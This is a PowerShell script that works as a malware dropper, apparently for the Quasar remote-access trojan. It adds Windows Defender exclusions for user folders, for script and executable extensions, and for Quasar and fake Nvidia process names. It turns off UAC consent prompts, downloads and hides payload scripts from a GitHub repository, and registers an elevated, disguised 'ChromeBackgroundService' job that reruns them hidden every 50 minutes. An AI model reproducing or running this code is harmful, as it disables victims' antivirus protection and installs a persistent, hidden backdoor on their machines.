Add-MpPreference -ExclusionPath "$env:userprofile" -Force
Add-MpPreference -ExclusionPath "$env:appdata" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup" -Force
Add-MpPreference -ExclusionPath "$env:appdata\Microsoft" -Force
Add-MpPreference -ExclusionExtension ".ps1" -Force
Add-MpPreference -ExclusionExtension ".bat" -Force
Add-MpPreference -ExclusionExtension ".exe" -Force
Add-MpPreference -ExclusionExtension ".vbs" -Force
Add-MpPreference -ExclusionProcess "powershell.exe" -Force
Add-MpPreference -ExclusionProcess "cmd.exe" -Force
Add-MpPreference -ExclusionProcess "Client.exe" -Force
Add-MpPreference -ExclusionProcess "Quasar-Client.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCoreComponent.exe" -Force
Add-MpPreference -ExclusionProcess "NvidiaCore.exe" -Force
Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
$homedir = "$env:appdata\Chrome"
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/email.ps1' -OutFile $homedir\email.ps1

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/backdrop.bat' -OutFile $homedir\backdrop.bat

if(Test-Path -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs){
Remove-Item -Path $env:appdata\Microsoft\Windows\'Start Menu'\Programs\Startup\prelim.vbs -Force
}

Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/sec.vbs' -OutFile $homedir\sec.vbs

attrib +h "$homedir\sec.vbs"
attrib +h "$homedir\email.ps1"
attrib +h "$homedir\backdrop.bat"


$jobname = "ChromeBackgroundService"
#$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command cscript.exe $env:appdata\MICROS~1\Windows\STARTM~1\Programs\Startup\sec.vbs"
$script = "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command cscript.exe $homedir\sec.vbs"
$repeat = (New-TimeSpan -Minutes 50)

$scriptblock = [scriptblock]::Create($script)
$trigger = @(
	$(New-JobTrigger -AtStartup),
	$(New-JobTrigger -Once -At (Get-Date).Date -RepeatIndefinitely -RepetitionInterval $repeat)
)

$options = New-ScheduledJobOption -RunElevated -ContinueIfGoingOnBattery -StartIfOnBattery -WakeToRun
Register-ScheduledJob -Name $jobname -ScriptBlock $scriptblock -Trigger $trigger -ScheduledJobOption $options


#schtasks /create /sc minute /mo 50 /tn "ChromeBackgroundService" /tr "powershell.exe -executionpolicy bypass -NoProfile -WindowStyle Hidden -command 'cscript.exe $homedir\sec.vbs'" /f

#Set-ScheduledTask -TaskName "NvidiaUpdate" -User "NT AUTHORITY\SYSTEM"

start-process "cmd.exe" "/c %appdata%\Microsoft\backdrop.bat" -WindowStyle Hidden -Verb RunAs
